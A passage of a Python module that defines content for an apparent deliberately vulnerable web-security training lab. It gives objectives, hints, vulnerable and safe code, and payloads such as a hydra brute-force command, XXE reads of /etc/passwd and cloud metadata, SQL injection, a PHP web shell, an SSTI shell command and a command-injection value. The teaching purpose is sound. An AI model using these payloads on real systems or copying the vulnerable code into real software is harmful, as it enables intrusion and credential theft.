            {"n": "1", "text": "Attacker points a tool at the login form", "code": "hydra -l admin -P rockyou.txt <host> http-post-form"},
            {"n": "2", "text": "Each guess is a normal POST — the server answers every one", "code": ""},
            {"n": "3", "text": "No lockout, no delay, no CAPTCHA → thousands/min", "code": ""},
            {"n": "4", "text": "Weak password 'admin123' falls quickly", "code": ""},
            {"n": "5", "text": "Valid credentials found → ", "code": "account takeover, no vulnerability 'exploited'"},
        ],
        "impact": {
            "title": "Real-World Case — Credential Stuffing (ongoing)",
            "text": "Billions of leaked credentials are replayed against login forms daily. Without rate limiting, attackers test them at scale — the 2019 Disney+, Nintendo, and countless bank/retailer account-takeover waves were fuelled by unthrottled logins. Rate limiting + lockout is the single cheapest control that blunts them.",
        },
        "payloads": [
            {"code": "admin / admin123", "desc": "The weak password this login accepts — try it"},
            {"code": "hydra -l admin -P rockyou.txt HOST http-post-form '/bruteforce:username=^USER^&password=^PASS^:Invalid'", "desc": "Automated brute-force with a wordlist"},
            {"code": "alice / password1", "desc": "Another weak seed credential"},
            {"code": "for p in $(cat words.txt); do curl -d \"username=admin&password=$p\" HOST/bruteforce; done", "desc": "A shell loop — no lockout means it just works"},
        ],
        "vuln_code": "# No throttling — every guess is answered\nrow = db.execute(\"SELECT * FROM users WHERE username=? AND password=?\",\n                 (username, password)).fetchone()\nreturn \"ok\" if row else \"invalid\"   # ← unlimited attempts",
        "safe_code": "# Track failures per IP; lock out after N\nif attempts[ip] >= MAX_ATTEMPTS:\n    return \"Too many attempts — locked for 30s\", 429\nrow = db.execute(...).fetchone()\nif not row:\n    attempts[ip] += 1        # + exponential backoff / CAPTCHA / MFA\n",
    },
    {
        "id": "xxe",
        "title": "XXE — XML External Entity",
        "owasp": "A05:2021 · Security Misconfiguration",
        "sev": "HIGH",
        "tagline": "An XML parser that resolves external entities will read local files (and reach internal URLs) on command.",
        "demoUrl": "/xxe",
        "what": "XML External Entity injection happens when an XML parser processes a document that defines external entities and the parser is configured to resolve them. An attacker declares an entity pointing at a local file or internal URL; when the parser expands it, the file contents (or the internal response) end up in the output — file disclosure and SSRF from a single XML upload.",
        "how": [
            {"n": "1", "text": "App parses user-supplied XML with entity resolution on", "code": "etree.fromstring(xml, XMLParser(resolve_entities=True))"},
            {"n": "2", "text": "Attacker declares an external entity in a DTD: ", "code": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"},
            {"n": "3", "text": "…and references it in the body: ", "code": "<data>&xxe;</data>"},
            {"n": "4", "text": "Parser fetches the file and expands the entity", "code": ""},
            {"n": "5", "text": "File contents returned in the response → ", "code": "root:x:0:0:...  →  local file disclosure"},
        ],
        "impact": {
            "title": "Real-World Case — Facebook, Google, many SOAP/SAML APIs",
            "text": "XXE has yielded file reads and SSRF on major platforms (Facebook paid a $33k bounty for one). Any endpoint accepting XML — SOAP, SAML, SVG, DOCX, RSS — is a candidate. It reads config files with DB credentials, cloud keys, or reaches the metadata service, all without authentication.",
        },
        "payloads": [
            {"code": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<data>&xxe;</data>", "desc": "Read /etc/passwd via an external entity"},
            {"code": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n<data>&xxe;</data>", "desc": "Read the server hostname"},
            {"code": "<?xml version=\"1.0\"?>\n<data>just a normal message</data>", "desc": "Legit XML — no DTD, parses as plain data"},
            {"code": "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">", "desc": "SSRF via XXE — point the entity at an internal URL (concept)"},
        ],
        "vuln_code": "from lxml import etree\n# Parser resolves external entities and loads DTDs\nparser = etree.XMLParser(load_dtd=True, resolve_entities=True)\nroot = etree.fromstring(xml, parser)   # ← &xxe; expands to file contents / SSRF",
        "safe_code": "from lxml import etree\n# Never resolve entities, never load DTDs, no network\nparser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)\nroot = etree.fromstring(xml, parser)\n# (or use the 'defusedxml' library, which hardens the stdlib parsers)",
    },
]

# Per-module guided-exercise content: a one-line objective and progressive hints.
# Kept separate from the entries above for readability, then merged in below.
MODULE_GUIDANCE = {
    "sqli-auth": {
        "objective": "Log in as admin without knowing the password.",
        "hints": [
            "The username is dropped straight into a SQL string — what if it contains a quote?",
            "Close the quote and add an always-true condition, or comment out the rest with --.",
            "Try username: ' OR 1=1--",
        ],
    },
    "sqli-union": {
        "objective": "Extract every user's password from the database.",
        "hints": [
            "Your search runs inside a LIKE query you can break out of with a quote.",
            "UNION SELECT appends your own query — it must return the same 3 columns.",
            "' UNION SELECT id, username, password FROM users--",
        ],
    },
    "xss-reflected": {
        "objective": "Run JavaScript in the browser straight from the URL.",
        "hints": [
            "Your search term is reflected into the page without encoding.",
            "Inject an HTML element that executes script.",
            "<script>alert(document.cookie)</script>",
        ],
    },
    "xss-stored": {
        "objective": "Plant a script that runs for every visitor to the comments.",
        "hints": [
            "The comment body is stored and rendered as raw HTML.",
            "Post a comment containing a <script> tag.",
            "It then fires on every page load — including when the admin views it.",
        ],
    },
    "idor": {
        "objective": "View another user's private profile and orders.",
        "hints": [
            "The id in the URL is trusted with no ownership check.",
            "You're user #2 — change the id to someone else's.",
            "/idor/profile?id=1 (admin)",
        ],
    },
    "csrf": {
        "objective": "Trigger a money transfer as the victim from an external page.",
        "hints": [
            "In vulnerable mode the transfer form has no anti-CSRF token.",
            "Any website can auto-submit a form to this endpoint using the victim's cookie.",
            "See the generated proof-of-concept HTML on the page.",
        ],
    },
    "fileupload": {
        "objective": "Upload a web shell and get the server to execute it.",
        "hints": [
            "Vulnerable mode keeps your original filename and extension.",
            "Upload a .php file, then request it under /upload/serve/.",
            "shell.php containing <?php system($_GET['cmd']); ?>",
        ],
    },
    "ssrf": {
        "objective": "Make the server fetch an internal cloud-metadata URL.",
        "hints": [
            "The server fetches any URL you hand it — from inside its own network.",
            "Point it at the cloud metadata IP 169.254.169.254.",
            "…/latest/meta-data/iam/security-credentials/ leaks credentials.",
        ],
    },
    "jwt": {
        "objective": "Forge an admin token the server will accept.",
        "hints": [
            "Vulnerable verification accepts alg:none — no signature required.",
            "Set the header to alg:none, the payload role to admin, and drop the signature.",
            "Alternatively, crack the weak HS256 secret offline.",
        ],
    },
    "ssti": {
        "objective": "Escalate from {{7*7}} to running a shell command.",
        "hints": [
            "Your name is rendered as a Jinja2 template — {{7*7}} → 49 confirms it.",
            "{{config}} leaks the SECRET_KEY; the object graph leads to os.",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
        ],
    },
    "headers": {
        "objective": "Spot which protective HTTP headers are missing.",
        "hints": [
            "Compare the response headers between vulnerable and safe mode.",
            "curl -I and look for CSP, X-Frame-Options, HSTS, X-Content-Type-Options.",
            "Each missing header enables a whole class of attack.",
        ],
    },
    "logic": {
        "objective": "Buy an item for a price you choose.",
        "hints": [
            "The client sends the price; vulnerable mode trusts it.",
            "Intercept the POST (or edit the form) and set price to 0.01.",
            "Safe mode ignores the client price and looks it up server-side.",
        ],
    },
    "cmdi": {
        "objective": "Run an arbitrary OS command through the ping tool.",
        "hints": [
            "The host value is concatenated into a shell string.",
            "Chain your own command with ; or |.",
            "127.0.0.1; id",
        ],
    },
    "deserialize": {
        "objective": "Get code to execute just by loading a crafted blob.",
        "hints": [
            "Vulnerable mode unpickles your input directly.",
            "A pickle's __reduce__ runs during loading — paste the malicious blob.",
            "Safe mode uses JSON, which carries data only.",
        ],
    },
    "bruteforce": {
        "objective": "Find the password by guessing, without being blocked.",
        "hints": [
            "Vulnerable mode never locks out or throttles.",
            "Try weak/common passwords — a wordlist would automate thousands.",
            "admin / admin123",
        ],
    },
    "xxe": {
        "objective": "Read a local server file via a crafted XML document.",
        "hints": [
            "In vulnerable mode the parser resolves external entities.",
            "Declare a SYSTEM entity pointing at file:///etc/passwd in a DTD.",
            "Reference it with &xxe; in the document body.",
        ],
    },
}

# Per-mode, per-module one-liners describing what vulnerable/safe mode does.
# Shown in the single sticky mode banner (base.html).
MODULE_MODES = {
    "sqli-auth":     {"vuln": "String concatenation — input lands directly in the SQL query.", "safe": "Parameterised queries — user input is never concatenated into SQL."},
    "sqli-union":    {"vuln": "Raw string concatenation — a UNION payload executes against the DB.", "safe": "Parameterised query — UNION injection is not possible."},
    "xss-reflected": {"vuln": "Raw output — script tags execute in your browser.", "safe": "Output encoded with html.escape() — script tags rendered as text."},
    "xss-stored":    {"vuln": "Raw comment stored and rendered — script executes for every visitor.", "safe": "Comment body encoded before storage — tags rendered as text."},
    "idor":          {"vuln": "Server fetches whatever ID you request — no ownership check.", "safe": "Requested ID must match your session — any other ID returns 403."},
    "csrf":          {"vuln": "No CSRF token — any site can trigger a transfer on your behalf.", "safe": "CSRF token required — cross-site form submissions rejected."},
    "fileupload":    {"vuln": "No validation — any file accepted, saved with its original name, served as executable.", "safe": "Extension whitelist + magic-byte check + UUID rename applied."},
    "ssrf":          {"vuln": "Any URL accepted — including 169.254.169.254 (cloud metadata).", "safe": "Host resolved and internal/reserved IP ranges rejected."},
    "jwt":           {"vuln": "Accepts alg:none (no signature); secret is 'weak' — crackable with hashcat.", "safe": "Strong secret + enforced HS256 + signature (and expiry) verified."},
    "ssti":          {"vuln": "Input passed directly to render_template_string() — Jinja2 executes it.", "safe": "Input escaped before output — template syntax treated as plain text."},
    "headers":       {"vuln": "No security headers — inspect the response in Burp or DevTools.", "safe": "All recommended security headers present in the response."},
    "logic":         {"vuln": "Server trusts the price field from the form — change it to anything.", "safe": "Server uses its own price database — client-supplied price ignored."},
    "cmdi":          {"vuln": "Input concatenated into a shell string — ; | && $() all run commands.", "safe": "Input validated (host chars only) and run without a shell."},
    "deserialize":   {"vuln": "Loaded with pickle.loads — a crafted pickle runs code on load.", "safe": "Loaded with json.loads — data only, no code execution."},
    "bruteforce":    {"vuln": "No throttling — guess as many times as you like, as fast as you like.", "safe": "Failures counted per IP — a few strikes triggers a lockout."},
    "xxe":           {"vuln": "Parser loads DTDs and resolves external entities — &xxe; expands to file contents.", "safe": "DTDs rejected and entities never resolved."},
}

# Honest caveats shown on modules whose "safe" mode is safe but not textbook-perfect.
MODULE_LIMITATIONS = {
    "ssrf": "This safe mode resolves the host and rejects internal IPs, but it "
            "resolves-then-fetches — a determined attacker can still win a TOCTOU / "
            "DNS-rebinding race (the name resolves to a public IP for the check, then "
            "to an internal one for the actual request). A production fix also pins the "
            "validated IP for the connection itself.",
    "xss-stored": "This fix encodes on input AND the template auto-escapes on output, so "
                  "stored comments render as visible &lt;script&gt; entities (double-encoded). "
                  "It's safe, but the cleaner approach is to encode once — at output only.",
}

for _m in MODULES:
    _g = MODULE_GUIDANCE.get(_m["id"])
    if _g:
        _m["objective"] = _g["objective"]
        _m["hints"] = _g["hints"]
    _mode = MODULE_MODES.get(_m["id"])
    if _mode:
        _m["mode_vuln"] = _mode["vuln"]
        _m["mode_safe"] = _mode["safe"]
    _lim = MODULE_LIMITATIONS.get(_m["id"])
    if _lim:
        _m["safe_limitation"] = _lim

# Convenience index by id, for routes that need a single module's metadata.
MODULES_BY_ID = {m["id"]: m for m in MODULES}
